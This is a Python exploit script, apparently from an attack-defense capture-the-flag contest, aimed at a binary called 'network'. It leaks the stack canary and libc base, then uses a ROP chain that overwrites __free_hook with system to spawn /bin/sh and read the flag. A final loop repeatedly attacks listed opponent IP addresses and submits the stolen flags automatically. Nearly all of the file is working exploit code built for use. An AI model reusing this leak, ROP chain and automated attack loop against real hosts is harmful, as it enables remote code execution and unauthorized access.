__author__ = "pxx"

from zio import *

target = "./network"
#target = ("0", 12345)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 20, print_read = r_m, print_write = w_m)
	return io

def send_data_packet(io, t_id, t_size, t_type, data):
	payload = ""
	payload += l32(t_id)
	payload += l32(1)
	io.writeline(str(len(payload)))
	#print repr(payload)
	io.write(payload)

	payload = ""
	payload += l32(t_size)
	payload += l32(t_type)
	payload += data.ljust(0x100, '\x00')
	io.writeline(str(len(payload)))
	#print repr(payload)
	io.write(payload)

def send_int_packet(io, t_id, t_val):
	send_data_packet(io, t_id, 4, 0, l32(t_val))

def send_buff_packet(io, t_id, t_buff):
	send_data_packet(io, t_id, len(t_buff), 1, t_buff)

def gen_update_packet(t_index, next_id, mask_id, target_id, padding = l32(0)*2):
	payload = ""
	payload += l32(t_index)
	payload += l32(0)
	payload += l32(next_id)
	payload += l32(mask_id)
	payload += l32(target_id)
	print len(padding), padding
	payload += padding[:8].ljust(8, '\x00')

	return payload

def send_update_packet(io, t_id, t_buff):
	payload = ""
	payload += l32(t_id)
	payload += l32(0)
	io.writeline(str(len(payload)))
	io.write(payload)

	payload = ""
	payload += t_buff
	io.writeline(str(len(payload)))
	io.write(payload)

from time import *

def leak_canary(io, array_list):
	#io.read_until("9-23, init_ok\n")

	send_int_packet(io, 9, 0);
	send_int_packet(io, 9, 1);
	io.read_until("name length:")
	send_int_packet(io, 9, 12);
	io.read_until("name:")
	send_buff_packet(io, 9, "pxx\n".ljust(12, '\x00'));
	io.read_until("msg length:")
	send_int_packet(io, 9, 0x108);
	io.read_until("msg:")
	send_buff_packet(io, 9, "aaa".ljust(0x100, '\x01'));
	#io.read_until("get packet 9(9)")

	#io.read_until("\n")
	sleep(1)

	index = -349697# - 1
	padding = 'modifyed'
	payload = gen_update_packet(index, 1, -1, 0x400, padding)
	send_update_packet(io, 8, payload)

	hashval0 = calc_hash(l32(18) + l32(8) + l32(0xffffffff) + l32(9) + l32(array_list[7][2]) + l32(array_list[7][3]))
	hashval_b = calc_hash(l32(20) + l32(9) + l32(0xffffffff) + l32(9))
	
	padding = l32(0) + l32((hashval0 - hashval_b)&0xffffffff)
	payload = gen_update_packet(1, 9, 0xffffffff, 9)
	send_update_packet(io, 7, payload)

	send_buff_packet(io, 9, "nihao\n".ljust(0x8, '\x00'));
	#io.interact()
	send_int_packet(io, 9, 2);

	io.read_until("msg:\n")
	data1 = io.read(0x200)
	print "--------------------"
	data = io.read(0x200)
	#print [c for c in data]
	for i in range(len(data)/8):
		print hex(l64(data[8*i:8*i+8]))
	i = 0
	canary = l64(data[8*i:8*i+8])

	i = 2
	libc_base = l64(data[8*i:8*i+8]) + 0x00007fdf8f74b000 - 0x7fdf8fb1c6ba
	print "canary:", hex(canary), hex(l64(data[8*i:8*i+8]))
	print "libc_base:", hex(libc_base)
	return canary, libc_base

def calc_hash(buff):
	result = 0
	for i in range(len(buff)/4):
		result += l32(buff[i*4:i*4+4])

	return result

def gen_call_func(func_got, arg1, arg2, arg3):
	#set_args_addr
	set_args_addr = 0x40205a
	call_func_addr = 0x402040
	payload = ""
	payload += l64(set_args_addr)
	payload += l64(0)            #pop rbx = 0
	payload += l64(1)            #pop rbp
	payload += l64(func_got)     #pop r12
	payload += l64(arg3)         #pop r13
	payload += l64(arg2)         #pop r14
	payload += l64(arg1)         #pop r15
	payload += l64(call_func_addr)

	return payload

def set_path2_qword(io, val, path1_index):
	payload = ""
	if val != 0:
		payload += "%%%dc%%%d$n"%(val, path1_index)
	else:
		payload += "%%%d$n"%(path0_index)
	io.writeline(str(len(payload)))
	io.write(payload)

def set_path2_last_byte(io, val, path0_index):
	payload = ""
	if val != 0:
		payload += "%%%dc%%%d$hhn"%(val, path0_index)
	else:
		payload += "%%%d$hhn"%(path0_index)
	io.writeline(str(len(payload)))
	io.write(payload)

def get_flag(io):
	sleep(1)
	#for i in range(100):
	#	io.writeline("cat /flag/flag")

	#io.read_until_timeout(1)
	io.writeline("8")
	io.writeline("/bin/sh;")
	io.interact()
	io.writeline("cat /flag/flag")
	data = io.read_until("\n", timeout = 2)
	#while len(data) < 0x20:
	#	data = io.read_until("\n")

	print data
	return data.strip()

def pwn(io):
	#io.read_until("9-23, init_ok\n")
	array_list = []
	io.read_until("Power On")
	io.read_until("\n")

	for i in range(10):

		array_each = []
		array_each.append(0)
		array_each.append(0)

		array_each.append(0)
		array_each.append(0)
		array_list.append(array_each)

	#print array_list
	#io.interact()
	canary, libc_base = leak_canary(io, array_list)
	print hex(canary)
	#io.gdb_hint()

	send_int_packet(io, 9, 0);
	send_int_packet(io, 9, 1);
	io.read_until("name length:")
	send_int_packet(io, 9, 12);
	io.read_until("name:")
	send_buff_packet(io, 9, "pxx\n".ljust(12, '\x00'));
	io.read_until("msg length:")
	send_int_packet(io, 9, 0x108);
	io.read_until("msg:")
	send_buff_packet(io, 9, "aaa".ljust(0x100, '\x01'));
	#io.read_until("get packet 9(9)")
	#io.read_until("\n")
	sleep(1)

	index = -699417 - 1# - 1
	#index = 0
	#sleep(2)
	#padding = l32(0) + l32(0x100)
	padding = 'modifyed'

	padding = l32(0x100) + l32(0x308)
	payload = gen_update_packet(index, 1, -1, 0x400, padding)

	#io.gdb_hint()
	send_update_packet(io, 7, payload)

	#io.interact()

	#payload = gen_update_packet(1, 1, -1, -1)
	#send_update_packet(io, 8, payload)
	#payload = gen_update_packet(2, 1, -1, -1)
	#send_update_packet(io, 8, payload)

	payload = gen_update_packet(1, 9, 0xffffffff, 9)
	send_update_packet(io, 6, payload)

	send_buff_packet(io, 9, "b"*8);
	#io.read_until("get packet 9(9)")
	#io.read_until("\n")
	sleep(1)

	payload = ""
	payload += "ccc".ljust(0x100-8, '\x01')
	payload += l64(canary) 

	send_buff_packet(io, 9, payload);
	#io.read_until("get packet 9(9)")
	#io.read_until("\n")
	sleep(1)

	read_got                   = 0x0000000000603068  
	free_got                   = 0x0000000000603018
	printf_got                 = 0x0000000000603040
	memcpy_got                 = 0x0000000000603088


	#offset_read = 0x3d2d90    
	#offset_system = 0x3d3b80    

	offset_system = 0x45390
	offset_read                = 0x3d94f0

	atoi_got                   = 0x00000000006030b0
	offset_system = 0x45390
	offset_binsh = 0x18cd17
	offset_atoi                = 0x36e80
   
	p_rdi_ret = 0x0000000000021102 + libc_base # : pop rdi ; ret
	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_binsh

	magic_addr = libc_base + 0x4526A
	xor_rax_ret = 0x000000000008b8c5 + libc_base # : xor rax, rax ; ret
	free_hook_addr = 0x3C67A8 + libc_base
	p_rdx_ret = 0x0000000000001b92 + libc_base # : pop rdx ; ret
	mov_rdi_rdx_ret = 0x00000000000f688a + libc_base # : mov qword ptr [rdi + 0x100], rdx ; ret

	sleep_addr = 0xCC230 + libc_base
	exit_addr = 0x3A030 + libc_base

	alarm_addr = 0xCC200 + libc_base

	printf_addr = 0x55800 + libc_base
	puts_addr = 0x6F690 + libc_base

	ret_addr = 0x0000000000000937 + libc_base #: ret 

	val_addr = 0x3C8900
	payload = ""
	payload += l64(0)
	#payload += l64(xor_rax_ret)
	#payload += l64(magic_addr)
	#payload += l64(p_rdi_ret) + l64(3)
	#payload += l64(alarm_addr)
	#payload += l64(p_rdi_ret) + l64(binsh_addr)
	#payload += l64(system_addr)
	#payload += l64(p_rdi_ret) + l64(binsh_addr)
	#payload += l64(puts_addr)
	payload += l64(p_rdi_ret) + l64(free_hook_addr - 0x100)
	payload += l64(p_rdx_ret) + l64(system_addr)
	payload += l64(mov_rdi_rdx_ret)
	payload += l64(p_rdi_ret) + l64(0x200)
	payload += l64(sleep_addr)

	#payload += gen_call_func(memcpy_got, free_got, printf_got, 8)
	#payload += gen_call_func(read_got, 15, printf_got, 8)

	"""
	payload += l64(p_rdi_ret) + l64(puts_got+8)
	payload += l64(p_rsi_r15_ret) + l64(8) + l64(0)
	payload += l64(get_buff_until_addr)

	payload += l64(p_rdi_ret) + l64(puts_got)
	payload += l64(p_rsi_r15_ret) + l64(6) + l64(0)
	payload += l64(get_buff_until_addr)

	payload += l64(p_rdi_ret) + l64(puts_got + 8)
	payload += l64(puts_plt)
	"""
	#payload = l64(ret_addr) * ((0x100 - len(payload))/8) + payload
	
	send_buff_packet(io, 9, payload.ljust(0x100, "\x03"));
	#io.read_until("get packet 9(9)")
	#io.read_until("\n")
	#sleep(1)

	send_int_packet(io, 9, 0);
	print "ready to exit"
	#io.gdb_hint()
	send_int_packet(io, 9, 3);

	io.read_until("bye~!\n")
	#io.gdb_hint()
	#sleep(1)
	return get_flag(io)

io = get_io(target)
flag = pwn(io)
print flag
submit_flag(flag)
exit(0)

from libad import *
import time
#"""
target = ('172.16.4.103', 20003)
#target = ('0', 12345)
#target = ('192.168.1.115', 6666)
io = get_io(target)
flag = pwn(io)
print flag
submit_flag(flag)
exit(0)
#"""
#problem3_targets = []
#problem3_targets.append(('172.16.13.103', 20003))
#problem3_targets.append(('172.16.4.103', 20003))
while True:
	success_list = []
	for target in problem3_targets:
		print target
		for i in range(1):
			try:
				io = get_io(target)
				flag = pwn(io)
				if flag != "":
					submit_flag(flag)
					success_list.append((target[0], flag))
					break
			except Exception as e:
				pass

	print len(success_list)
	for ip in success_list:
		print ip
	time.sleep(30)